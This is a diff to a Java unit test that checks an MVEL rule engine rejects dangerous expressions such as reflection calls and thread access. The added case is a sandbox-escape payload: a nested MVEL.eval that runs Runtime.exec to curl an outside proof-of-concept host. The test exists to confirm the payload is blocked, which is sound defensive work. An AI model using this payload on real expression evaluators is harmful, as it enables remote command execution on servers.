@@ -145,6 +145,7 @@ class MvelRuleStrategyTest {
                 Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().newInstance()"),
                 Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getField('value')"),
                 Arguments.of(RuleCallStatus.FAILURE, "'a'.getClass().getDeclaredField('value')"),
+                Arguments.of(RuleCallStatus.FAILURE, "org.mvel2.MVEL.eval('Runtime.getRuntime().exec(\\\"curl http://automaton.nixy.stg-drove.phonepe.nb6/testdrovepoc\\\")');true"),
 
                 // ---- Thread/System etc ----
                 Arguments.of(RuleCallStatus.FAILURE, "Thread.currentThread()"),
